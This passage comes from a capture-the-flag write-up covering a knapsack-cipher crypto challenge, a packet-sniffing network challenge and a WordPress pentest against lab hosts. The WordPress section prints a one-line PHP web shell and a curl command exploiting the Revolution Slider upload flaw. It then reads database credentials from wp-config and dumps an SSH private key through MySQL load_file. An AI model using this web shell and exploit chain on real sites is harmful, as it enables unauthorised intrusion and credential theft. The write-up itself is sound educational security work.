The way the key is generated is not important for the solution of this
challenge, but we'll desctibe it anyway. We start with an array with `n`
elements, but this one is [superincreasing](https://en.wikipedia.org/wiki/Superincreasing_sequence).
Let's call this array `a_i` ( `1 < i < n` ) the private key. We then
choose `q` and `r` such that `GCD(r, q) = 1` and `q > sum(i = 0 -> n) a_i ` . We
then define `b_i := a_i * r (mod q)` , this is our public key.

Encryption is done by taking `c = sum(i = 1 -> n) b_i * x_i` , where `x_i` is
the `i`-th bit of the message. This can then be decrypted by taking `c * r^-1 (mod q)`
and solving the [knapsack problem](https://en.wikipedia.org/wiki/Knapsack_problem)
with this value and the private key. (This happens to be quite easy, since the
private key is superincreasing.)

It turns out there is an [attack](https://ieeexplore.ieee.org/document/1056964)
on this cryptosystem due to Adi Shamir. However, the paper describes solving a
much harder problem than the one in this challenge, since our `n` is quite small
( `n = 8` ).

Since our keys are so small, we can compute the encryption of all 8-bit
sequences and match this to the encrypted flag we're given.

```python
mapping = dict()
for c in range(256):
    enc = 0
    for i in range(8):
        if c&(1<<i):
            enc += pkey[i]
    mapping[hex(enc)[2:]] = c
```

Once we have this mapping, we decode the first character by looking for the
shortest substring from the beginning of the text that is found in our mapping,
repeating until the entire text is decrypted.

```python
d = ''
while ctext:
    if not d and ctext[0] == '0':
        ctext = ctext[1:]
    d += ctext[0]
    ctext = ctext[1:]

    if d in mapping:
        print(mapping[d], end='')
        d = ''
```

This code may fail if the shortest substring is not the answer. Luckily,
this code works with this key as long as the plaintext does not contain a space
character, and a few other non-printable characters.

- flag: `gig_em{merkle-hellman-knapsack}`
- solution: [solution.py](holey-knapsack/solution.py)

## Stop and Listen
**Category**: Network/Pentest

> Sometimes you just need to stop and listen.
> 
> This challenge is an introduction to our network exploit challenges, which are hosted over OpenVPN.
> 
> Instructions:
> 
> - Install OpenVPN. Make sure to install the TAP driver.
>   - Debian (Ubuntu/Kali) linux CLI: `apt install openvpn`
>   - [Windows GUI installer](https://openvpn.net/community-downloads/)
> - Obtain your OpenVPN configuration in the challenge modal.
>   - You will obtain a separate config for each challenge containing connection info and certificates for authentication.
> - Launch OpenVPN:
>   - CLI: `sudo openvpn --config ${challenge}.ovpn`
>   - Windows GUI: Place the config file in `%HOMEPATH%\OpenVPN\config` and right-click the VPN icon on the status bar, then select the config for this challenge
> 
> The virtual `tap0` interface will be assigned the IP address `172.30.0.14/28` by default. If multiple team members connect you will need to choose a unique IP for both.
> 
> The standard subnet is 172.30.0.0/28, so give that a scan ;)
> 
> If you have any issues, please let me (nategraf) know in the Discord chat
> 
> Some tools to get started:
> 
> - [Wireshark](https://www.wireshark.org/)
> - [tcpdump](http://man7.org/linux/man-pages/man1/tcpdump.1.html)
> - [nmap](https://nmap.org/)
> - [ettercap](http://www.ettercap-project.org/ettercap/)
> - [bettercap](https://github.com/bettercap/bettercap/)
> 
> [OpenVPN Config](listen/listen.ovpn)

We first try a port scan with `nmap -vvv 172.30.0.0/28`, but we don't get any
open ports.

Let's just try what the challenge description says and just open wireshark, see
what's going on...

Immediately, we see UDP packets from 172.30.0.2 to the broadcast address
(172.30.0.15), each packet with a short quote that seems to be from the
Hitchhiker's Guide to the Galaxy. Go through the packets for a while, until you
come across one that contains the flag.

The packet looks like [this](listen/capture.pcapng).

- flag: `gigem{f0rty_tw0_c9d950b61ea83}`

## Wordpress
**Category**: Network/Pentest

> I setup my own Wordpress site!
> 
> I love that there are so many plugins. My favorite is Revolution Slider. Even though it's a little old it doesn't show up on wpscan!
> 
> Please give it about 30 seconds after connecting for everything to setup correctly.
> 
> The flag is in `/root/flag.txt`
> 
> Difficulty: medium
> 
> [OpenVPN Config](wordpress/wordpress.ovpn)

We find two hosts with `nmap`.

```
Nmap scan report for 172.30.0.2
Host is up (0.18s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for 172.30.0.3
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.30.0.14
Host is up (0.00019s latency).
All 1000 scanned ports on 172.30.0.14 are closed

Nmap done: 16 IP addresses (3 hosts up) scanned in 20.75 seconds
```

The http server hosts a wordpress site. As hinted in the challenge description,
we run the `wpscan` utility to scan for vulnerable components:

```
[...]
[+] revslider
 | Location: http://172.30.0.3/wp-content/plugins/revslider/
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WordPress Slider Revolution Local File Disclosure
 |     Fixed in: 4.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7540
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
 |      - https://www.exploit-db.com/exploits/34511/
 |      - https://www.exploit-db.com/exploits/36039/
 |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
 |      - http://packetstormsecurity.com/files/129761/
 |
 | [!] Title: WordPress Slider Revolution Shell Upload
 |     Fixed in: 3.0.96
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7954
 |      - https://www.exploit-db.com/exploits/35385/
 |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
 |
 | The version could not be determined.
```

There are two vulnerabilities, one for file read and one for file write.
Unfortunately, the arbitrary file read isn't enough for us to read out the flag,
since the flag is in a directory only readable by root. This means we first need
to be able to log in as root on the webserver.

We use the upload vulnerability to upload a simple php file we can execute
scripts from.

```php
<?php
system($_GET['cmd'])
?>
```

[ZIP](wordpress/revslider.zip) the file and upload it.

```
$ curl http://172.30.0.3/wp-admin/admin-ajax.php -F "action=revslider_ajax_action" -F client_action=update_plugin -F update_file=@revslider.zip
```

This will make the script available at `http://172.30.0.3/wp-content/plugins/revslider/temp/update_extract/revslider/cmd.php`.

Use this to explore the filesystem, etc. until we come across the file at
`/var/www/note.txt`, which says that "Your ssh key was placed in /backup/id\_rsa
on the DB server. "

Also, we can obtain the credentials for the DB server by reading the file
located at `/var/www/wp-config.php`.

```php
<?php
[...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', '0NYa6PBH52y86C');

/** MySQL hostname */
define('DB_HOST', '172.30.0.2');
[...]
```

Armed with this information, we log into the MySQL server and read out the
backed up SSH key.

```
MySQL [(none)]> select load_file('/backup/id_rsa');
[...]
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc
tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt
ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33
ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw
8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6
Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt
1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX
AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY
WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L
oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN
l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9
oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv
5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl
SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0
bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc
iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO
LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN
nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ
SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa
WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB
dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB
E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv
hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg
bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe
On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==
-----END RSA PRIVATE KEY-----
[...]
```

This [key](wordpress/id_rsa) allows us to log in as root on the webserver. Now,
we can just read out the flag, since we have read access to the file.

- flag: `gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}`
